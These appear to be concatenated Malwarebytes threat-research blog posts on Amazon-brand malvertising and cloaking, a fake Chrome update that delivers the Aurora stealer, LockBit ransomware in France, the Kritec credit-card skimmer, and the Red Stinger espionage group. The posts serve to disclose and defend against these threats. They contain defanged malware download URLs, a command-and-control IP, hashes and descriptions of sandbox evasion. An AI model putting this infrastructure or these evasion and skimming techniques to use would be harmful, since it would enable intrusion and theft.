It only takes a few seconds between a search and a click on a result, and most of the time that click happens to be on whatever shows up first. This is why advertisers are buying ads on search engines, not only to drive traffic towards their brands but also to outpace potential competitors. Unfortunately, not all advertisers have good intentions and the worst of them will exploit anything they can to put out ads that are malicious.

For about a week we decided to pull some examples and focused on Amazon-related searches since it is a popular search term (although other popular brands are affected as well). The ads we found were not only claiming to be Amazon's official website, they also displayed the amazon.com URL in the ad.

Below is an animation showing what happens when a victim clicks on one of those ads:

Figure 6: Malicious advert leads to phishing page

While most of the brand impersonations we have seen recently are pushing tech support scams, this is not the only threat facing consumers. For example, we saw an ad that pretended to be Amazon's login page but instead redirects users to a phishing site, first stealing their password before collecting their credit card number.



Figure 7: A malicious ad leading to a phishing site

How are these criminals evading detection?

Ad URL

Part of the problem here is that advertisers can be legitimate affiliates and associated with the Amazon brand. Here's an example of a seller that is advertising on Google and has their own page as an affiliate on Amazon:



Figure 8: An advertiser leveraging the Amazon brand correctly

The problem comes when an advertiser that displays a brand's official URL within the ad snippet (i.e. https://www.amazon.com) is allowed to submit an ad URL that has nothing to do with that brand. We have seen many examples that include URL shorteners, cloaking services or domains freshly registered for the sole purpose of malicious activity.

Figure 9: Incidents related to Amazon searches tracked in malvertising spreadsheet

The screenshot above is part of a document we have shared with Google where we and other researchers track new malvertising campaigns ranging from scams to malware distribution.

Anti-bot traffic funneling and cloaking

Threat actors often rely on traffic filtering services to push malicious content exclusively to intended victims. Practically all the malicious ads we showed earlier used a kind of traffic distribution and filtering system. This market is a bit of a gray area with some companies advertising as anti-bot or anti-fraud providers while others are shamelessly advertising in places frequented by online criminals.

The goal is to not only game Google's and other ad networks but also to ensure that only qualified traffic is allowed to come through. With most malvertising from click ads, the practice comes down to something called cloaking.

With cloaking, there are two types of URLs used: the legitimate URL (or decoy) and the money URL (the malicious one). In the picture below we see such parameters as well as the threat actor’s money page which contains folders for Amazon (amz) and YouTube - another keyword abused by malvertisers - (ytb) malvertising campaigns:

Figure 10: Cloaking parameters showing the money page

In this specific case we discovered a number of domains registered by the scammer, serving more or less the same purpose. One important thing to remember is that these domains are not immediately seen by Google. For example, the traffic filtering service will detect if a click is from a real user or a machine. It can then decide to forward the bogus click to Amazon's website and therefore maintain its cover.

Figure 11: Infrastructure used to redirect Google ads to tech support scams

For real traffic, these domains will act as intermediary to the payload pages which tend to be highly disposable and ever changing. There is a simple reason in that these are clearly malicious and will get reported and taken down. However, it is rare for the malvertising infrastructure to actually be disrupted because it is further upstream and rarely documented properly. This allows threat actors to continue with their malicious ad campaigns and simply swap payload pages.

Can Bard fix Google's malvertising problem?

We asked Google's AI chatbot Bard if it could fix the malvertising problem that seems to be plaguing its search engine. At first Bard said it was not able to solve this issue:

Figure 12: Bard answering a query about malvertising

However, on a second attempt Bard claimed it could after all help to fix the malvertising problem:

Figure 13: Bard answering the same question in a different way

Regardless, malvertising is a complex issue and given the billions of daily ad impressions, it's easy for someone nefarious to abuse any given platform. But we don't need AI to identify certain elements that allow threat actors to impersonate brands. Also, while educating users about malvertising is important, we can't blame them for clicking on paid ads that are supposedly verified as trusted.

Needless to say that these incidents will encourage users to install ad blockers at the chagrin of publishers whose revenues are heavily dependent on advertising. In the end, it comes down to the user experience and ensuring that it comes first, before anything else.

We then asked for some tips to protect against malvertising. We couldn't help but notice that Bard suggested using an ad blocker, although a small disclaimer at the bottom clearly states that Bard may display information that does not represent Google's views. Indeed, the ad industry accounts for almost 80% of Google’s revenues.

Figure 14: Bard offers some tips on how to protect from malvertising

Malvertising has been a problem for many years and it's unlikely to change any time soon. It's important for users to be aware that criminals can buy ads and successfully bypass security mechanisms all the while impersonating well-known brands. If you decide to type the URL in the address bar instead, remember to be careful not to make a typo. This is another area that is highly targeted by typosquatters and can also involve malvertising redirects.

All of the ads mentioned in this blog post have been reported to Google. We would like to thank the people working in the ad unit for their continued support.

Malvertising seems to be enjoying a renaissance as of late, whether it is from ads on search engine results pages or via popular websites. Because browsers are more secure today than they were 5 or 10 years ago, the attacks that we are seeing all involve some form of social engineering.

A threat actor is using malicious ads to redirect users to what looks like a Windows security update. The scheme is very well designed as it relies on the web browser to display a full screen animation that very much resembles what you'd expect from Microsoft.

The fake security update is using a newly identified loader that at the time of the campaign was oblivious to malware sandboxes and bypassed practically all antivirus engines. We wrote a tool to 'patch' this loader and identified its actual payload as Aurora stealer. In this blog post, we detail our findings and how this campaign is connected to other attacks.

A convincing ""system update""

Windows users are quite familiar with system updates, often interrupting hours of work or popping up in the middle of an intense game. When that happens, they just want to install whatever needs to be installed and get on with their day.

A threat actor is buying popunder ads targeting adult traffic and tricking victims with what appears to a system security update.

Figure 1: A fake system update hijacks the screen

As convincing as it looks, what you see above is actually a browser window that is rendered in full screen. This becomes more obvious when downloading the update file named ChromeUpdate.exe.

Figure 2: The 'Chrome update' downloaded from the web browser

Fully Undetectable (FUD) malware

While the file name appears as ChromeUpdate.exe, it uses the Cyrillic alphabet such that certain characters look similar but are different on disk. Its hex representation is %D0%A1hr%D0%BEm%D0%B5U%D1%80d%D0%B0t%D0%B5.exe as can be seen in the image below:

Figure 3: Hex encoding and Cyrillic alphabet

When we first ran the sample into a sandbox, we could not see anything obvious or that it was even malicious. The file would simply run and exit quickly. Over a couple of weeks, we collected nine different samples that looked more or less the same.

We also noticed that the threat actor was uploading each of his new builds to VirusTotal, a service owned by Google, to check if they were being detected by antivirus engines. The first user to submit each new sample always uploaded them from Turkey (country code TR) and in many instances the file name looked like it had come fresh from the compiler (i.e. build1_enc_s.exe).

Figure 4: User submissions to VirusTotal

While VirusTotal is no replacement for a full endpoint security product, with its 70 AV engines it is usually a good indicator to quickly check if a file is malicious or not. For more than 2 weeks, the samples had 0 detection on VT and it wasn't until a blog post by Morphisec that detections started to appear. This new loader is called Invalid Printer and so far appears to have been used exclusively by this threat actor to bypass security products.

Figure 5: VirusTotal detections coincide with blog release

We actually stumbled upon Morphisec's blog thanks to Threatray which identified similarities with a file we submitted to their sandbox. The service's built-in OSINT identified similar samples and linked them with security articles.

Figure 6: Threatray analysis page

Patching the loader

Invalid Printer performs a check on the computer's graphic card and specifically its vendor ID which it compares against known manufacturers such as AMD, NVidia. Virtual machines and sandboxes in general do not use real hardware and will fail to pass the check.

We were able to patch the samples we had collected and identify their payload. The patch consists of replacing the graphics card check with a random number and always returning true, therefore allowing the file to run in any sandbox.

Figure 7: Python script to patch loader

The automated malware unpacking service from OpenAnalysis UnpacMe now supports properly unpacking samples using the Invalid Printer loader. It allowed us to determine what malware family is being distributed as well as indicators of compromise. For example, one of our samples (31c425510fe7f353002b7eb9d101408dde0065b160b089095a2178d1904f3434) has the same command and control server (94.142.138[.]218) as one mentioned in Morphisec's blog.

Figure 8: UnpacMe results page

In this specific malvertising campaign, the payload used was the Aurora Stealer, a popular piece of malware that is designed to harvest credentials from systems.

Campaign stats

The threat actor is using a panel to track high level stats about visitors to the fake system update web page. Based on the numbers from this panel, there were 27,146 potential unique victims and 585 of them downloaded the malware during the past 49 days.

Figure 9: Panel showing browser visits and downloads

Figure 10: Browser user-agents, IP addresses and geolocation

War and Russia references

We believe there is a single threat actor behind this malvertising campaign and others such as the one Morphisec uncovered. The malware author seems to take a very high interest in creating FUD malware and constantly uploads it to VirusTotal to verify, always using the same submitter profile.

We couldn't help but notice a possible reference to the war in Ukraine left within the fake Chrome Update page and commented out:

Figure 11: Commented HTML code

Some of the websites belonging to this threat actor were not loading malware but instead had a single YouTube video promoting the cities and landscapes of Russia:

Figure 12: YouTube video about Russia in 12K HDR

Additionally, we found some connections with tech support scams and even an Amadey panel that also appears to belong to the threat actor.

Protection

Malwarebytes already protected users from this malvertising campaign by blocking the malicious ads involved. We detect the payloads as Spyware.Aurora.

Special thanks to Roberto Santos for help with the sample and binary patching.

Malwarebytes Threat Intelligence - April 2023 1,https://www.malwarebytes.com/blog/threat-intelligence/2023/04/ransomware-review-france,"Posted: April 13, 2023 by

In the last 12 months France was one of the most attacked countries in the world, and a favourite target of LockBit, the world's most dangerous ransomware.

This article is based on research by Marcelo Rivero, Malwarebytes' ransomware specialist, who monitors information published by ransomware gangs on their dark web sites. In this report, ""known attacks"" are attacks where the victim opted not to pay a ransom. This provides the best overall picture of ransomware activity, but the true number of attacks is far higher.



Between April 2022 and March 2023, France was one of the most attacked countries by ransomware gangs. During that period:

France was the fifth most attacked country in the world.

The government sector was attacked more often than in similar countries.

LockBit dominated the last twelve months, being used in 57% of known attacks.

There were almost twice as many LockBit attacks in France than either the UK or Germany.

In July 2022, La Poste Mobile, a mobile carrier owned by French postal company La Poste, suffered a LockBit ransomware attack, severely impacting its administrative and management services. After successfully reducing the ransom demand from $1.4 million to $300,000 in a five day negotiation, La Poste Mobile's negotiator announced on July 11, ""Management doesn’t want to pay anymore ... it has reconsidered its decision."" LockBit published the data it had stolen on its leak site, describing it as ""the private information of more than a million and a half people in France.""

The La Poste Mobile page on the LockBit leak site

In August 2022, attackers demanded $10 million after a ruthless assault on the Center Hospitalier Sud Francilien (CHSF), a 1000-bed hospital near Paris. The disruption to CHSF's computer systems resulted in patients having to be sent elsewhere, and surgeries having to be postponed.

A few months later, in mid-November, French defense and technology group Thales confirmed a data breach affecting contracts and partnerships in Malaysia and Italy. As with so many attacks in France in the last twelve months, the perpetrators used LockBit ransomware.

France is a prime target

In the 12 months from April 2022 to March 2023, France was a globally significant target for ransomware, and the fifth most attacked country by known attacks.

Known attacks in the ten most attacked countries, April 2022 - March 2023

Given the disparity between the USA and the rest of the world in terms of number of attacks it would be easy to conclude that ransomware is, first-and-foremost, a USA problem. It is not. The size and nature of the US economy means that it has many more targets for ransomware gangs than the other countries in the top ten.

We can account for the difference in the size of countries' economies by dividing the number of known ransomware attacks by a country's nominal GDP, which gives us an approximate rate of attacks per $1T of economic output. On that basis, the difference between France and the USA is far smaller than the total number of known attacks would suggest. And while France and Germany suffered nearly identical numbers of known attacks, France appears to suffer a much higher rate of attacks per unit of economic activity than its neighbour.

The ten most attacked countries between April 2022 - March 2023, ordered by attacks per $1T GDP

The size of the countries in the top ten also vary enormously, and we can try to account for that by dividing known attacks by the size of each country's population. On that measure, again, the differences between countries are far smaller than a simple count of known attacks suggests.

In all the variations of our top ten, English-speaking countries occupy at least three of the top five positions, which suggests that ransomware gangs have a slight bias for English-speaking targets. France sits just below the Anglosphere in a cluster of four advanced European economies suffering nearly identical rates of attacks per capita.

The ten most attacked countries between April 2022 - March 2023, ordered by attacks per capita

By any measure, France is one of the most attacked countries in the world, and its organisations are prime targets for ransomware gangs. Unusually, government targets accounted for a significant proportion of those organisations in the last twelve months. It was the country's third most attacked sector, accounting for 9% of known attacks. By comparison, over the same twelve month period, 4% of known attacks in the USA and 3% of known attacks in Germany affected their government sectors, while just 20 miles across the English channel, the UK experienced none at all.

Known ransomware attacks by industry sector in France, April 2022 - March 2023

As is often the case, the reasons for this are not obvious. It is possible that this simply reflects the larger footprint of government in France—government spending accounts for a larger proportion of the economy in France than in either the UK or Germany. However, the difference is only a few percentage points.

Ransomware gangs often operate from the safe havens of Russia and the Commonwealth of Independent states, which can make it tempting to ascribe nationalistic or geopolitical motivations to their activity. However, the truth is they are businesses that choose targets that are easy to infiltrate and likely to pay substantial ransoms.

Unfortunately, the most likely explanation for the high proportion of government sector targets among the known attacks in France is that government institutions were easier targets in France than elsewhere.

LockBit's hunting ground

The most dangerous ransomware in the world right now, is LockBit, and LockBit loves France.

In 2022, LockBit was used in 31% of known attacks globally, 3.5 times more than its nearest competitor, ALPHV. (You can read much more about why LockBit is the number one threat to your business in our 2023 State of Malware report.) As you'd expect, given its global preeminence, LockBit was also the most widely used ransomware in France, Germany, and the UK in the last twelve months.

However, LockBit dominates in France in a way that it doesn't in its European neighbours. Between April 2022 and March 2023, LockBit accounted for an absolutely enormous 57% of known attacks in France. Over the same period, it accounted for 20% of known attacks in the UK and about 30% in Germany.

LockBit recorded 62 known attacks in France in the last twelve months, but no other gang registered more than seven. In the same period LockBIt was responsible for 33 known attacks in the UK while six other gangs also got into double digits.

Ransomware with two or more known attacks in France, April 2022 - March 2023

LockBit's outsized contribution to France's misery is most clearly seen by highlighting its contribution on a month-by-month basis. The number of monthly attacks in France has been highly volatile, showing far larger variation than the UK, despite its proximity and the similarity of their economies and populations. That volatility is almost entirely down to how many or how few LockBit attacks occurred each month. In the last twelve months only one other gang has registered three known attacks in a single month (Royal in March 2023), while LockBit has matched or exceeded that figure eight times, and exceeded ten attacks in a month twice.

Monthly ransomware attacks in France with LockBit highlighted, April 2022 - March 2023

The reasons for this aren't clear, but it may simply be that as the 800lb gorilla in the ransomware ecosystem, LockBit is best placed to exploit opportunities outside of the Anglosphere. Like a lot of ransomware, LockBit is sold as a service and attacks are carried out by independent criminal gangs, referred to as ""affiliates"", which pay the LockBit gang 20% of the ransoms they extract. The French economy is large enough to provide a fertile hunting ground for cybercriminals. It is possible that some of LockBit's 100 or so affiliates have decided to specialise there.

Conclusions

In the last 12 months, France was a globally significant hunting ground for ransomware gangs, and the country with the fifth highest total of known attacks. Within France, the government sector was over represented, suffering a higher proportion of known attacks than the government sector in the USA, Germany, and the UK. Much like the education sector in the UK, the French government sector should be alarmed that with an entire world of targets to choose from, it has attracted a disproportionate amount of attention.

France attracted enormous attention from gangs using LockBit, the most dangerous ransomware in the world. There were almost twice as many known LockBit attacks in France than in either Germany or the UK. In all, LockBit was used in 57% of known attacks in France, while the next most used ransomware, Vice Society, accounted for just 6%.

France does not so much have a ransomware problem as a LockBit problem.

How to avoid ransomware

Block common forms of entry . Create a plan for patching vulnerabilities in internet-facing systems quickly; disable or harden remote access like RDP and VPNs; use endpoint security software that can detect exploits and malware used to deliver ransomware.

Malwarebytes Threat Intelligence - April 2023 2,https://www.malwarebytes.com/blog/threat-intelligence/2023/04/kritec-art,"Posted: April 27, 2023 by

It's hard to put individuals at fault when the malicious copy is better than the original. This credit card skimmer was built to fool just about anyone.

To ensnare new victims, criminals will often devise schemes that attempt to look as realistic as possible. Having said that, it is not every day that we see the fraudulent copy exceed the original piece.

While following up on an ongoing Magecart credit card skimmer campaign, we were almost fooled by a payment form that looked so well done we thought it was real. The threat actor used original logos from the compromised store and customized a web element known as a modal to perfectly hijack the checkout page.

While the technique to insert frames or layers is not new, the remarkable thing here is that the skimmer looks more authentic than the original payment page. We were able to observe several more compromised sites with the same pattern of using a custom-made and fraudulent modal.

This skimmer and associated campaigns represent one of the most active Magecart attacks we have been tracking in recent months.

Smooth checkout

We identified a compromised online website for a Parisian travel accessory store running on the PrestaShop CMS. A skimmer we previously identified as Kritec, was injected and loading malicious JavaScript that altered the checkout process. In the following section, we will compare the checkout process when the skimmer is active and when it is not.

Fraudulent payment form

What we see here is the use of a 'modal' which is a web page element displayed in front of the current active page. The modal disables and grays out the background so that the user can focus on the presented element instead. This is an elegant way for website owners to keep their customers on the same web site and have them interact with another form.

Figure 1: Compromised store loads fake payment modal

The problem is that this modal is entirely fake and designed to steal credit card data. It may sound hard to believe given everything matches to the original brand and feel of the site. Before digging further into why it is fraudulent, we will take a look at the same online store when the skimmer has been disabled.

Actual (real) payment form

In order to view this legitimate sequence, we first had to block the skimmer when requesting the e-commerce page. In our case, we simply blocked the connection to the malicious domain where the skimmer is hosted. As a result, the website will display what the original payment form should be (prior to the compromise).

Figure 2: Legitimate payment form when same store is not compromised

The actual payment flow for this merchant is to redirect users to a third-party processor hosted by Dalenys, now part of Payplug, a French payment solutions company. So rather than display a modal, it loads the webpage for the payment processor to allow the user to enter their banking information. Once that is validated, it will take them back to the merchant page.

Malicious modal

The malicious modal is built very cleanly and contains an animation that displays the store's logo in the middle and then moves it back up. We have to give credit where credit is due: this is a very well done skimmer that is actually a smoother user experience than the store's default. We should also note that the malware author is not only well versed in web design, they also use proper language (French) for each form field.

Figure 3: A closer look at the fake modal

However, we noticed a small mistake in the hyperlink for Politique de confidentialité (terms of use). That link redirects to the terms of use for Mercardo Pago, a payment processor used in South America. It is likely the threat actor copied the data from a previous template and did not notice their mistake. This is just a detail, and does not affect the functionality of the skimmer at all.

We can try to look for this erroneous hyperlink within the skimmer source code in order to confirm that the modal was created by the threat actor. The skimmer is rather complex and heavily obfuscated but we can see that HTML content is generated dynamically and goes through a decodeURIComponent routine.

Figure 4: Extracting code from the skimmer to reveal connection with the modal

If we step through the code until the modal is loaded, we can grabbing the Base64 value corresponding to the HTML content. One we have it, we can convert it to plain text and finally see the reference to mercadopago, that is proof that the skimmer is the one rendering this beautiful modal. In fact, we can see the whole thing is an iframe called v.ECPay:

Figure 5: The iframe created by the skimmer to display the modal

Full payment flow

We recreated the payment flow from the perspective of a customer shopping via that compromised store. We can see that upon selecting the credit card payment option, the malicious modal is loaded and will harvest their payment card details.

A fake error is then displayed briefly ""votre paiment a été annulé"" (your payment was cancelled) before the user is redirected to the real payment URL:

Figure 6: Payment process flow with the skimmer active

On the second attempt, the payment will go through and victims will be unaware of what just happened.

The skimmer will drop a cookie which will serve as an indication that the current session is now marked as completed. If the user was to go back and attempt the payment again, the malicious modal would no longer be displayed (instead the real payment method by the external processor Dalenys will be used).

Figure 7: Cookie dropped by skimmer once data has been stolen

Ongoing, covert campaigns

We now believe this Kritec skimmer is part of the same compromises with injections into vulnerable websites where malicious code is placed within the Google Tag Manager script. It is possible multiple threat actors are involved in those campaigns and customizing skimmers accordingly.

While many hacked stores had a generic skimmer, it appears the custom modals were developed fairly recently, maybe a month or two ago. The threat actor is using different domains to host the skimmer but names them in a similar way: [name of store]-loader.js.

We crawled several thousand e-commerce sites and found more fraudulent modals, in different languages.

Figure 8: A Dutch e-commerce site with the fake modal

Figure 9: A Finnish e-commerce site with the fake modal

Discerning whether an online store is trustworthy has become very difficult and this case is a good example of a skimmer that would not raise any suspicion.

If you are a Malwarebytes customer, you will get a notification and block when attempting to make a purchase from a store that has been compromised by this skimmer.

Malwarebytes Threat Intelligence - May 2023 3,https://www.malwarebytes.com/blog/threat-intelligence/2023/05/redstinger,"Posted: May 10, 2023 by

We discovered a new interesting lure that targeted the Eastern Ukraine region and started tracking the threat actor behind it.

This blog post was authored by Malwarebytes' Roberto Santos and Fortinet's Hossein Jazi

While the official conflict between Russia and Ukraine began in February 2022, there is a long history of physical conflict between the two nations, including the 2014 annexation of Crimea by Russia and when the regions of Donetsk and Luhansk declared themselves independent from Ukraine and came under Russia's umbrella. Given this context, it would not be surprising that the cybersecurity landscape between these two countries has also been tense.

While looking for activities from the usual suspects, one of our former coworkers at Malwarebytes Threat Intelligence Team discovered a new interesting lure that targeted the Eastern Ukraine region and reported that finding to the public. Moreover, we started tracking the actor behind it, which we internally codenamed Red Stinger.

This investigation remained private for a while, but Kaspersky recently published information about the same actor (who it called Bad Magic). Now that the existence of this group is public, we will also share some of our information about the actor and its tactics.

Our investigation could be helpful to the community as we will provide new undisclosed data about the group. We have identified attacks from the group starting in 2020, meaning that they have remained under the radar for at least three years. Additionally, we will provide insights into the latest campaigns performed by Red Stinger, where we have found that the group has targeted entities in different places of Ukraine.

Military, transportation and critical infrastructure were some of the entities being targeted, as well as some involved in the September East Ukraine referendums. Depending on the campaign, attackers managed to exfiltrate snapshots, USB drives, keyboard strokes, and microphone recordings.

Finally, we will reveal unknown scripts and malware run by the group in this report.

Timeline

Our investigation started in September 2022, when one of our former coworkers Hossein Jazi discovered an interesting lure, that seemed to target some entities over the war context:

Tweet published by @hjazi in September 2022

In fact, this is the attack that Kaspersky analyzed in its blog. However, this was not the only activity carried out by the group. Malwarebytes has identified multiple operations, first dated in 2020. The next infographic shows some of the operations recognized by us:

Operations performed by Red Stinger

Since our investigation started in September 2022, information about the initial campaigns has been limited. However, the actor's tactics, techniques, and procedures (TTPs) are very distinctive, which gives us a high level of confidence in our attribution.

Notes about activity before the war

OP#1 - Late 2020

The first operation we know of happened in December 2020. Although the infection chain is similar to what was already reported, the attackers were using a slightly different process back in 2020:

OP#1 Infection phase

An MSI file is downloaded from hxxp://91.234.33.185/f8f44e5de5b4d954a83961e8990af655/update.msi. This first MSI file, when executed, will show the following error to the user:

MSI file used in OP#1

In the background, this MSI file will execute a .vbs file that runs a dll file. The content is encoded using base64:

Contents of zip file and detail of shortcut.vbs

So finally, cachelib.dll will be executed. That file will drop two files named iesync.so and iesync.vbs.

iesync.so and iesync.vbs were dropped as part of OP#1 infection phase

After that, the iesync.vbs file will apply a XOR operation to iesync.so. After applying that conversion to the file, we can see that this file is what we called DBoxShell (also called PowerMagic by Kaspersky):

DboxShell variant used in OP#1

OP#2 - April 2021

We believe that the attack started with this zip file named ПОСТАНОВЛЕНИЕ № 583-НС.zip. How attackers sent this file to victims is still unknown. The lure in this case was themed about Luhansk:

Lure used in OP#2

A valid translation of this document would be:

RESOLUTION

dated March 25, 2021 No. 584-NS

Lugansk

On consideration in the second reading of the draft law

of the Luhansk People's Republic dated March 19, 2021 No 417-PZ / 21-3

""On Amendments to the Law of the Luhansk People's Republic

""On physical culture and sports""



ПОСТАНОВЛЕНИЕ № 583-НС.zip contains a lnk file as well as the previous pdf. This .lnk file will download an MSI file from the url hxxp://91.234.33.108/u3/ebe9c1f5e5011f667ef8990bf22a38f7/document.msi, and from there, the attack is pretty similar as the one performed in OP#1. Just a few differences to note, for example, in this case the dll used is named libsys.dll.

Dll used at infection phase in OP#2

Also, as the image shows, paths used the folder winappstorepackage or WinStoreApps instead of CacheWidgets, that was used in OP#1. Also, the powershell script is slightly different in this case:

Powershell snippet run in OP#2

Nevertheless, the infection phase finally used DBoxShell, as before.

OP#3 - September 2021

We have very little information about this operation, but based on the TTPs, we have identified overlapping techniques with both previous and subsequent attacks.

MSI files usage is a known signature from the group. Also, the MSI file was downloaded from hxxp://185.230.90.163/df07ac84fb9f6323c66036e86ad9a5f0d118734453342257f7a2d063bf69e39d/attachment.msi. Note the common pattern in urls.

185.230.90.163 belongs to ASN number 56485. All IPs used from 2020 till now belong to the same ASN.

VT telemetry showed common patterns with OP#2.

Activity at the onset of war

After the war began, we collected information about two distinct operations.

OP#4 - February 2022

OP#4 is perhaps one of the most interesting attacks performed by the group. As you can see in the following lines, this attack still has some characteristics that led us to attribute it to Red Stinger. Furthermore, the attack has some unique features that make it stand out as one of the most interesting ones.

In this case, the group used hxxp://176.114.9.192/11535685AB69DB9E1191E9375E165/attachment.msi to download the malicious MSI file. Note once more this common pattern in all URLs used by the group. This MSI file contained a PDF, a .vbs file, and a .dat file:

Lure used in OP#4

The group followed a similar infection chain as in previous operations. Finally, a .vbs file was responsible for XORing and executing a .dat file, which contained a small loader and a variant of DBoxShell:

DboxShell variant used in OP#4

DBoxShell is malware that utilizes cloud storage services as a command and control (C&C) mechanism. This stage serves as an entry point for the attackers, enabling them to assess whether the targets are interesting or not, meaning that in this phase they will use different tools.

A better look of how RedStinger operates can be seen in the next infographic:

Common pattern in Red Stinger operations

After the infection phase, we are aware that actors dropped at least the following artifacts:

SolarTools

In the reconnaissance phase, we noticed the execution of 2 MSI files named SolarTools.msi and Solar.msi. Both had inside tools named ngrok.exe and rsockstun.exe:

Ngrok.exe is a legitimate tool that allows web developers to deploy applications and expose services to the internet. Other groups also used ngrok for malicious purposes.

Rsockstun is a tool that allows attackers to route connections through external proxies.

More important, we have seen the same version of Solar.msi (02f84533a86fd2d689e92766b1ccf613) on OP#4 and OP#5, allowing us to connect the dots between these two attacks.

vs_secpack.msi

In addition to SolarTools, starting the exfiltration phase, we also found another file named vs_secpack.msi. This file contains two files: ntinit.exe and ntuser.dat, which will be located under c:/ProgramData/NativeApp. Ntinit.exe is a file that was developed as a Windows Service, named ntmscm.

Service created by ntinit.exe

Inside that service, eventually a thread will be executed. This thread contains all the functionality. Its main purpose is to execute one of the binaries hidden inside ntuser.dat, after some parsing. Also, it will execute C:/ProgramData/user.dat, if found.

vs_secpack.msi will drop ntuser.dat and ntinit.exe files

Ntuser.dat is an aggregation of PE files with a leading header and a final chunk. These executables are xored, each one with a different value. The next image shows the header:

Detail of Ntuser.dat header

This header can be seen as a C structure, defined like this:

struct head_FirstChunk{

DWORD signature;

DWORD osInstallDate;

int sizeMz1;

int sizeMz2;

int sizeMz3;

int sizeMz4;

int sizeConfig;

DWORD xorValsMZ1;

DWORD xorValsMZ2;

DWORD xorValsMZ3;

DWORD xorValsMZ4;

}

Following this header, four PE files are stored consecutively and XORed. As the previous structure shows, the size and XOR value used to decode these files can be recovered from the header.

ntuser.dat contents

We won't analyze all MZs one by one, as we want to avoid overwhelming the reader with technical details that are out of scope. For a quick reference, the first MZ was a copy of ntinit.exe and the second was a dll capable of injecting files using the Process Doppelganging technique. Curiously, InjectorTransactedHollow.dll string was found inside the binary, so possibly that was how attackers named the file originally:

Process Hollowing technique was used to perform injections in OP#4

The third was also used for injection purposes. The fourth was the most interesting, because it communicates with a new Dropbox account. Some of these will be injected or used to inject MZs into legitimate process mobisync.exe

Finally, the last chunk of ntuser.dat was a configuration file. The configuration was encrypted, and looked like this:

Config file forms the end of ntuser.dat

That configuration was encrypted using AES. The IV is the first 16 bytes of the config. The key can be recovered from the fourth MZ. In fact, this executable will use this configuration to communicate with Dropbox.

Decrypted configuration is shown next:

Decrypted config file

This configuration is pretty representative of the group’s motivation. First of all, we see a new Dropbox account being used. This Dropbox account will be used to gather exfiltrated victims data. It can be seen like the exfiltration phase starts here. Note that attackers will use one account for reconnaissance and a different one for exfiltration.

The object field was also revealing. It contained a Russian name (redacted for privacy) followed by the DNR letters (probably Donetskaya Narodnaya Respublika, referring to one of the cities declared independent in 2014, and a known target to the group). Victimology will be discussed later.

OP#5

OP#5 was the last known activity we will cover. As Kaspersky already revealed some technical details about this operation, we won’t repeat that analysis again. A link to the analysis made by them can be found at the beginning of this report.

What we can do here is provide some extra insights regarding the attack. Let's start at the Reconnaissance phase. Reconnaissance phase starts right after DBoxShell / GraphShell is executed. This is the GraphShell version used in OP#5:

OP#5 used GraphShell instead of DBoxShell

The way GrapShell works is pretty simple, and also can be almost guessed by viewing the image. A folder tree is created:

Root

\___ AmazonStore

\___ clients

\___ tasks

\___results

And as DBoxShell does, clients will hold heartbeats from clients, tasks will store tasks that will be executed at some point by victim systems, and results will be uploaded to results.

DETAIL - RECONNAISSANCE PHASE

As we were actively tracking the actors for a while, we managed to recover most of the actions performed by the attackers at this phase:

After that, by using some of the tooling analyzed by Kaspersky, the exfiltration phase starts.

Victimology

OP#4

As this operation happened before our investigation started, we cannot determine how many victims were infected. However, at the time we began monitoring, we still had information about two victims. Surprisingly, these two victims were located in central Ukraine. This is interesting because all the information had previously pointed to East Ukraine, where the Donbass region is located.

Map of Ukraine, where known targets in OP#4 were highlighted

One of the victims was a military target, but the activity on this target was only carried out for a few hours. We have reason to believe that the user noticed something wrong, and executed an antimalware solution shortly after being infected, which likely detected and cleaned the system.

As far as we know, attackers managed to exfiltrate on this target several screenshots, microphone recordings and some office documents.

The other victim we found was located in Vinnitsya. Target was an officer working in critical infrastructure. Attackers made a great and long surveillance of this victim, which extended until Jan 2023. They have exfiltrated screenshots, microphone and office documents, but also keystrokes were uploaded.

OP#5

With the victimology shared in OP#4, we may think that this was a group targeting only UA-aligned entities. However, the analysis of OP#5 revealed an interesting fact: it mainly targeted RU-aligned entities.

REFERENDUM TARGETS

OP#5 started in September 2022. Back in those days, Russia made referendums at Luhansk, Donetsk, Zaporizhzhia and Kherson. While that was happening, Red Stinger targeted and made surveillance to officers and individuals involved in those elections.

Two victims attacked in OP#5 were workers at Yasinovataya Administration (Donetsk). Another victim was also part of DPR administration, in Port Mariupol. All of them were performing different activities regarding elections. We also have found one victim holding the advisor position from CEC (Central Election Commission). According to Wikipedia, “The Central Election Commission of the Russian Federation (Russian: Центральная избирательная комиссия Российской Федерации, abbr. ЦИК, also Центризбирком) is the superior power body responsible for conducting federal elections and overseeing local elections in the Russian Federation”.

Central Election Commission of the Russian Federation (CIK) stamp

Regarding CEC, we had seen another victim codenamed CIK_03D502E0. CIK is also another term that could refer to CEC. Attackers showed great interest in this one, as this victim was one of the only ones with its own name (some were just identified by using a drive ID). Also, USB drives from that victim were uploaded. Next image shows a small fraction of filenames exfiltrated by the attackers. To clarify, TИK probably stands for TEC (Territorial Election Commision).

Detail of exfiltrated USB from CIK_03D502E0

Reconnaissance phase also revealed some nice info. DNS records obtained from another victim showed mail.gorod-donetsk.org, pop.gorod-donetsk.org, which could suggest that the victim was part of DPR administration.

From that same victim, those DNS records revealed connections against xn--j1ab.xn--b1adbccegehv4ahbyd6o2c.xn--p1ai (лк[.]лидерывозрождения[.]рф) translate Revival Leaders. That website was created ""in behalf of Putin"", and is a contest to find potential leaders and fill out positions at Kherson, Zaporozhye, DPR and Lugansk. It is unclear which positions will be filled by that, but winners were promised to get 1.000.000 rubles for a personally chosen training program in the Russian Federation.

OTHER VICTIMS

In addition to the victims involved in the September referendums, we also identified two other victims that did not seem to be related to the elections. One of them appeared to be related to the transportation ministry or equivalent, codenamed by the attackers as ZhdDor, which could be translated as ""railroad."" We also found additional data that suggested that the attackers could be interested in transportation.

Furthermore, we discovered that a library in Vinnitsya was infected in OP#5. Although this victim was UA-aligned, we do not understand why it was a target, especially since it was the only UA entity targeted in OP#5. However, it is worth noting that in OP#4, an entity located in Vinnitsya was also targeted.

EASTERN EGG

Finally, we have 2 victims named TstSCR and TstVM. It turns out that attackers, at some point, infected their own machines in order to carry out some testing, or by mistake.

Exfiltrated screenshot showing one of the attacker’s machine

This first image is a good example of that. First of all, we noticed that the keyboard language was set to ENG, which is unexpected. This may suggest that the group was composed of native English speakers. However, we find it strange because of the way they named the project folder (internet_WORK). We cannot be certain, but we believe that no native speaker would use that naming convention.

Exfiltrated screenshot showing one of the attacker’s machine while debugging Overall.exe

